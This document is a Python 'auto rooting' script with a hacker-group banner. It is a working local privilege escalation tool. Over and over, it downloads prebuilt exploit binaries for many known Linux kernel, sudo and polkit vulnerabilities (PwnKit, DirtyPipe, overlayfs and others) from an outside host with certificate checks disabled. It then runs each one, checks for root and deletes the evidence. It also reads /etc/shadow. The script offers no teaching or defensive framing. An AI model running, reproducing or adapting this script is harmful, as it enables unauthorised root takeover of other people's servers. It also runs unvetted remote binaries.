# -*- coding: utf-8 -*-
import os
import subprocess

RED = '\033[91m'
ENDCOLOR = '\033[0m'

print("*" * 60)
print("{}Auto Rooting Server By: 💀Seobarbar1337-TegalXploiter💀{}".format(RED, ENDCOLOR))
print("{}Blog: https://www.xploit.info{}".format(RED, ENDCOLOR))
print("*" * 60)

def check_root():
    if os.geteuid() == 0:
        print()
        print('Successfully Get Root Access')
        print('ID     =>', os.getuid())
        print('WHOAMI =>', os.getenv('USER'))
        print()
        exit()

def check_pkexec_version():
    output = subprocess.check_output(['pkexec', '--version']).decode('utf-8')
    version = None
    for line in output.splitlines():
        if line.startswith('pkexec version'):
            version = line.split()[-1]
            break
    return version

def run_commands_with_pkexec():
    pkexec_version = check_pkexec_version()
    print("pkexec version:", pkexec_version)

    if pkexec_version == '0.105' or pkexec_version == '0.96' or pkexec_version == '0.95' or pkexec_version == '0.096':
        subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/exp_file_credential', '--no-check-certificate'])
        os.chmod('exp_file_credential', 0o777)
        subprocess.call('./exp_file_credential', shell=True)
        check_root()
        os.remove('exp_file_credential')
        os.system('rm -rf exp_dir')
    else:
        print("pkexec ora supported")

run_commands_with_pkexec()

print("====== Menjalankan Pwnkit ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/ak', '--no-check-certificate'])
os.chmod('ak', 0o777)
subprocess.call('./ak', shell=True)
check_root()
os.remove('ak')
os.system('rm -rf GCONV_PATH=.')
os.system('rm -rf .pkexec')

print("====== Menjalankan ptrace ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/ptrace', '--no-check-certificate'])
os.chmod('ptrace', 0o777 )
subprocess.call('./ptrace', shell=True)
check_root()
os.remove('ptrace')

print("====== Menjalankan CVE-2022-0847-DirtyPipe-Exploits ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out', '--no-check-certificate'])
os.chmod('a2.out', 0o777 )
os.system('find / -perm 4000 -type -f 2>/dev/null or find / -perm -u=s -type -f 2>/dev/null ')
subprocess.call('./a2.out /usr/bin/sudo', shell=True)
check_root()
subprocess.call('./a2.out /usr/bin/passwd', shell=True)
check_root()
os.remove('a2.out')

print("====== Menjalankan sudodirtypipe ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/sudodirtypipe', '--no-check-certificate'])
os.chmod('sudodirtypipe', 0o777 )
subprocess.call('./sudodirtypipe /usr/local/bin', shell=True)
check_root()
os.remove('sudodirtypipe')

print("====== Menjalankan af_packet ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/af_packet', '--no-check-certificate'])
os.chmod('af_packet', 0o777 )
subprocess.call('./af_packet', shell=True)
check_root()
os.remove('af_packet')

print("====== Menjalankan CVE-2015-1328 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/CVE-2015-1328', '--no-check-certificate'])
os.chmod('CVE-2015-1328', 0o777 )
subprocess.call('./CVE-2015-1328', shell=True)
check_root()
os.remove('CVE-2015-1328')

print("====== Menjalankan CVE-2016-9793 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/CVE-2016-9793', '--no-check-certificate'])
os.chmod('CVE-2016-9793', 0o777 )
subprocess.call('./CVE-2016-9793', shell=True)
check_root()
os.remove('CVE-2016-9793')

print("====== Menjalankan cve-2017-16995 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/cve-2017-16995', '--no-check-certificate'])
os.chmod('cve-2017-16995', 0o777 )
subprocess.call('./cve-2017-16995', shell=True)
check_root()
os.remove('cve-2017-16995')

print("====== Menjalankan exploit-debian ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/exploit-debian', '--no-check-certificate'])
os.chmod('exploit-debian', 0o777 )
subprocess.call('./exploit-debian', shell=True)
check_root()
os.remove('exploit-debian')

print("====== Menjalankan exploit-ubuntu ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/exploit-ubuntu', '--no-check-certificate'])
os.chmod('exploit-ubuntu', 0o777 )
subprocess.call('./exploit-ubuntu', shell=True)
check_root()
os.remove('exploit-ubuntu')

print("====== Menjalankan newpid ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/newpid', '--no-check-certificate'])
os.chmod('newpid', 0o777 )
subprocess.call('./newpid', shell=True)
check_root()
os.remove('newpid')

print("====== Menjalankan raceabrt ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/raceabrt', '--no-check-certificate'])
os.chmod('raceabrt', 0o777 )
subprocess.call('./raceabrt', shell=True)
check_root()
os.remove('raceabrt')

print("====== Menjalankan timeoutpwn ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/timeoutpwn', '--no-check-certificate'])
os.chmod('timeoutpwn', 0o777 )
subprocess.call('./timeoutpwn', shell=True)
check_root()
os.remove('timeoutpwn')

print("====== Menjalankan upstream44 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/upstream44', '--no-check-certificate'])
os.chmod('upstream44', 0o777 )
subprocess.call('./upstream44', shell=True)
check_root()
os.remove('upstream44')

print("====== Menjalankan lpe.sh ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/lpe.sh', '--no-check-certificate'])
os.chmod('lpe.sh', 0o777 )
os.system('head -2 /etc/shadow')
subprocess.call('./lpe.sh', shell=True)
check_root()
os.remove('lpe.sh')

print("====== Menjalankan a.out ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/a.out', '--no-check-certificate'])
os.chmod('a.out', 0o777 )
subprocess.call('./a.out 0 && ./a.out 1', shell=True)
check_root()
os.remove('a.out')

print("====== Menjalankan linux_sudo_cve-2017-1000367 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367', '--no-check-certificate'])
os.chmod('linux_sudo_cve-2017-1000367', 0o777 )
subprocess.call('./linux_sudo_cve-2017-1000367', shell=True)
check_root()
os.remove('linux_sudo_cve-2017-1000367')

print("====== Menjalankan overlayfs ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/overlayfs', '--no-check-certificate'])
os.chmod('overlayfs', 0o777 )
subprocess.call('./overlayfs', shell=True)
check_root()
os.remove('overlayfs')

print("====== Menjalankan CVE-2017-7308 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/CVE-2017-7308', '--no-check-certificate'])
os.chmod('CVE-2017-7308', 0o777 )
subprocess.call('./CVE-2017-7308', shell=True)
check_root()
os.remove('CVE-2017-7308')

print("====== Menjalankan CVE-2022-2639 ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/CVE-2022-2639', '--no-check-certificate'])
os.chmod('CVE-2022-2639', 0o777 )
subprocess.call('./CVE-2022-2639', shell=True)
check_root()
os.remove('CVE-2022-2639')

print("====== Menjalankan polkit-pwnage ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/polkit-pwnage', '--no-check-certificate'])
os.chmod('polkit-pwnage', 0o777 )
subprocess.call('./polkit-pwnage', shell=True)
check_root()
os.remove('polkit-pwnage')

print("====== Menjalankan RationalLove ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/RationalLove', '--no-check-certificate'])
os.chmod('RationalLove', 0o777 )
subprocess.call('./RationalLove', shell=True)
check_root()
os.remove('RationalLove')

print("====== Menjalankan userspec ======")
subprocess.call(['wget', '-q', 'https://0-gram.github.io/id-0/exploit_userspec.py', '--no-check-certificate'])
os.chmod('exploit_userspec.py', 0o777)
subprocess.call('python3 exploit_userspec.py', shell=True)
check_root()
os.remove('exploit_userspec.py')
os.remove('0')
os.remove('kmem')
os.remove('sendfile1')
